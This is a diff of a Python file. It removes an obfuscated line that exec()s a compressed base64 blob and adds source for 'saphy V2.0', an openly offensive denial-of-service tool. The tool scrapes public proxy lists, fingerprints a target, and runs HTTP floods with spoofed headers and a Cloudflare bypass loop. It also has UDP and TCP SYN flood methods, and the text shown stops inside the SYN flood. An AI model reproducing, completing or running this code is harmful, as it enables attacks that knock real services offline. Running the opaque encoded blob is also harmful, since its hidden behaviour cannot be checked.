@@ -1,1 +1,623 @@
-import zlib,base64;exec(zlib.decompress(base64.b64decode(b"""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""")))
+# saphy V2.0
+# Developed by: LYNSS
+import threading
+import asyncio
+import aiohttp
+import aiohttp_socks
+import random
+import time
+import os
+import socket
+import cloudscraper
+import requests
+import json
+import re
+import scapy
+from scapy.all import IP, TCP, UDP, ICMP, send
+from rich.console import Console
+from rich.live import Live
+from rich.table import Table
+from rich.panel import Panel
+from colorama import Fore, Style, init
+from aiohttp_socks import ProxyConnector
+from cloudscraper import create_scraper
+
+def fake_ip():
+    return '.'.join(str(random.randint(1, 254)) for _ in range(4))
+
+def fake_headers(base_url, user_agents):
+    return {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Referer": base_url,
+        "X-Bot-ID": str(random.randint(1000, 9999)),
+        "X-Forwarded-For": fake_ip(),
+        "Via": "1.1 proxy-bot"
+    }
+
+def categorize_proxies(proxy_list):
+    http, socks4, socks5 = [], [], []
+    for proxy in proxy_list:
+        if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", proxy):
+            if "socks4" in proxy.lower():
+                socks4.append(proxy.replace("socks4://", ""))
+            elif "socks5" in proxy.lower():
+                socks5.append(proxy.replace("socks5://", ""))
+            else:
+                http.append(proxy.replace("http://", ""))
+    return http, socks4, socks5
+
+def geo_ip(ip):
+    try:
+        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        data = res.json()
+        return f"{data.get('country', 'N/A')} ({data.get('city', 'N/A')})"
+    except:
+        return "Unknown"
+
+def get_connector(proxy, proxy_type):
+    if proxy_type == "http":
+        return aiohttp.TCPConnector(ssl=False)
+    elif proxy_type == "socks4":
+        return ProxyConnector.from_url(f"socks4://{proxy}")
+    elif proxy_type == "socks5":
+        return ProxyConnector.from_url(f"socks5://{proxy}")
+    else:
+        return None
+    
+
+# Initialize colorama
+init(autoreset=True)
+
+# Load user agents
+def load_user_agents():
+    with open('useragents.txt', 'r') as f:
+        return [line.strip() for line in f if line.strip()]
+
+# Proxy Scraper 
+def scrape_proxies():
+    proxy_sources = [
+        "https://www.proxy-list.download/api/v1/get?type=socks4",
+        "https://www.proxy-list.download/api/v1/get?type=socks5",
+        "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxies.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
+        "https://proxyspace.pro/socks5.txt",
+        "https://proxyspace.pro/http.txt",
+        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+        "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
+        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
+        "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys/main/cnfree.txt",
+        "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/all.txt",
+        "https://raw.githubusercontent.com/yuceltoluyag/Free-Proxy-List/main/proxies/proxy-list.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
+        "https://github.com/TheSpeedX/PROXY-List/raw/master/http.txt",
+        "https://geonode.com/free-proxy-list",
+        "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/proxies.txt",
+        "https://github.com/jetkai/proxy-list/raw/main/online-proxies/txt/proxies-http.txt",
+        "https://free-proxy-list.net/",
+        "https://github.com/oxylabs/free-proxy-list/raw/main/proxy.txt",
+        "https://spys.me/proxy.txt",
+        "https://proxyelite.info/files/proxy/http.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
+        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-http.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-socks4.txt",
+        "https://raw.githubusercontent.com/jetkai/proxy-list/main/archive/txt/proxies-socks5.txt",
+        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies_anonymous.txt",
+        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/socks4.txt",
+        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4.txt",
+        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
+        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
+        "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
+        "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/https.txt",
+        "https://raw.githubusercontent.com/malbink/Free-Proxy-List/master/proxies.txt",
+        "https://raw.githubusercontent.com/aniyun009/free-proxy-list/main/proxy-list.txt",
+        "https://raw.githubusercontent.com/andybalholm/aaa-proxy-list/main/list.txt",
+        "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
+        "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/https.txt",
+        "https://raw.githubusercontent.com/zloi-user/hideip.me/main/proxies.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
+        "https://raw.githubusercontent.com/hanwaytech/free-proxy-list/main/proxy-list.txt",
+        "https://raw.githubusercontent.com/Bardiafa/Proxy-Leecher/main/output.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/https.txt",
+        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list_anonymous.txt",
+        "https://raw.githubusercontent.com/Jiejiejiayou/IPTVProxy/main/proxy/http.txt",
+        "https://raw.githubusercontent.com/Jiejiejiayou/IPTVProxy/main/proxy/socks5.txt"
+    ]
+    proxies = set()
+    print(f"{Fore.YELLOW}[!] Scraping fresh proxies...")
+    for url in proxy_sources:
+        try:
+            r = requests.get(url, timeout=10)
+            for line in r.text.splitlines():
+                proxy = line.strip()
+                if proxy:
+                    proxies.add(proxy)
+        except Exception as e:
+            print(f"{Fore.RED}[!] Failed scraping {url}: {e}")
+    print(f"{Fore.GREEN}[+] Scraped {len(proxies)} proxies!\n")
+    return list(proxies)
+
+
+# Analyze target info
+def analyze_target(url):
+    print(f"{Fore.CYAN}[i] Analyzing target...")
+    info = {
+        "server": "Unknown",
+        "powered_by": "Unknown",
+        "cloudflare": False,
+        "content_type": "Unknown",
+        "content_length": 0,
+        "connection": "Unknown"
+    }
+    try:
+        response = requests.get(url, timeout=10)
+        info["server"] = response.headers.get('Server', 'Unknown')
+        info["powered_by"] = response.headers.get('X-Powered-By', 'Unknown')
+        info["content_type"] = response.headers.get('Content-Type', 'Unknown')
+        info["content_length"] = int(response.headers.get('Content-Length', 0) or 0)
+        info["connection"] = response.headers.get('Connection', 'Unknown')
+        info["cloudflare"] = 'cloudflare' in (info["server"].lower() + info["powered_by"].lower())
+
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Status Code: {response.status_code}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Server: {info['server']}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] X-Powered-By: {info['powered_by']}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Type: {info['content_type']}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Length: {info['content_length']}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Connection: {info['connection']}")
+        print(f"{Fore.LIGHTMAGENTA_EX}[~] Behind Cloudflare: {'Yes' if info['cloudflare'] else 'No'}\n")
+        if response.status_code != 200:
+            print(f"{Fore.RED}[!] Warning: Target may be DOWN or BLOCKED!\n")
+    except Exception as e:
+        print(f"{Fore.RED}[!] Target analysis failed: {e}\n")
+    return info
+
+# Suggest attack modes
+def suggest_attack_modes(info):
+    suggestions = []
+
+    if info.get('cloudflare'):
+        suggestions.append("random-method")
+    if 'html' in info.get('content_type', ''):
+        suggestions.append("http-flood")
+        suggestions.append("random-uri")
+    if 'json' in info.get('content_type', ''):
+        suggestions.append("post")
+    if 'keep-alive' in info.get('connection', '').lower():
+        suggestions.append("cookie")
+    if info.get('content_length', 0) > 500000:
+        suggestions.append("cache-bypass")
+
+    return suggestions
+
+# Global counters
+counters = {
+    "total": 0,
+    "success": 0,
+    "error": 0
+}
+lock = threading.Lock()
+
+# Header Generator
+def generate_headers(url, user_agents, mode="basic"):
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Referer": url
+    }
+    if mode == "cookie":
+        headers["Cookie"] = f"session={random.randint(100000, 999999)}"
+    elif mode == "referer":
+        headers["Referer"] = random.choice([
+            "https://google.com", "https://bing.com",
+            "https://facebook.com", "https://tiktok.com"
+        ])
+    elif mode == "cache":
+        headers["Cache-Control"] = "no-cache"
+    return headers
+
+# Async attack
+async def generic_attack(url, duration, user_agents, proxy, proxy_type, method="GET", uri_random=False, data=None, header_mode="basic", random_method=False):
+    end_time = time.time() + duration
+    timeout = aiohttp.ClientTimeout(total=10)
+
+    connector = get_connector(proxy, proxy_type)
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        while time.time() < end_time:
+            try:
+                path = f"?id={random.randint(1, 999999)}" if uri_random else ""
+                headers = fake_headers(url, user_agents)
+                use_method = method if not random_method else random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"])
+
+                async with session.request(
+                    method=use_method,
+                    url=url + path,
+                    headers=headers
+                ) as response:
+                    await response.read()
+
+                with lock:
+                    counters["total"] += 1
+                    counters["success"] += 1
+            except:
+                with lock:
+                    counters["total"] += 1
+                    counters["error"] += 1
+
+# Cloudflare bypass
+def cloudflare_bypass(url, duration, user_agents):
+    scraper = cloudscraper.create_scraper(
+        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
+    )
+    
+    end_time = time.time() + duration
+
+    while time.time() < end_time:
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Referer": random.choice([
+                "https://google.com", "https://bing.com", "https://yahoo.com",
+                "https://facebook.com", "https://twitter.com", "https://instagram.com",
+                "https://tiktok.com", "https://reddit.com",
+                "https://github.com", "https://stackoverflow.com",
+
+            ]),
+            "Accept-Language": "en-US,en;q=0.9",
+            "Cache-Control": "no-cache"
+        }
+
+        try:
+            response = scraper.get(url, headers=headers, timeout=10)
+
+            # Cloudflare challenge detection
+            if "cf-chl-bypass" in response.text or "Attention Required" in response.text:
+                raise Exception("Cloudflare challenge page detected")
+
+            with lock:
+                counters["total"] += 1
+                counters["success"] += 1
+        except Exception:
+            with lock:
+                counters["total"] += 1
+                counters["error"] += 1
+        
+        time.sleep(random.uniform(0.8, 2.5))
+
+# Stats Dashboard
+def stats_dashboard(url, duration):
+    start = time.time()
+    end_time = start + duration
+    prev_total = 0
+    while time.time() < end_time:
+        time.sleep(1)
+        with lock:
+            total = counters["total"]
+            success = counters["success"]
+            error = counters["error"]
+        rps = total - prev_total
+        prev_total = total
+
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"{Fore.LIGHTYELLOW_EX}=== Saphy v2.0 - Attack Dashboard ==={Style.RESET_ALL}")
+        print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
+        print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
+        print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
+        print(f"{Fore.LIGHTGREEN_EX}Successful    : {success}")
+        print(f"{Fore.LIGHTRED_EX}Errors        : {error}")
+        print(f"{Fore.LIGHTMAGENTA_EX}Current RPS   : {rps}\n")
+
+# ======= Layer 4 Class =======
+
+class Layer4Attack:
+    def __init__(self, target_ip, target_port, duration, threads):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.duration = duration
+        self.threads = threads
+        self.end_time = time.time() + duration
+
+    def udp_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                payload = random._urandom(random.randint(32, 1024))
+                sock.sendto(payload, (self.target_ip, self.target_port))
+                sock.close()
+            except:
+                pass
+
+    def tcp_syn_flood(self):
+        while time.time() < self.end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.01)
+                sock.connect_ex((self.target_ip, self.target_port))
+                sock.send(random._urandom(16))
+                sock.close()
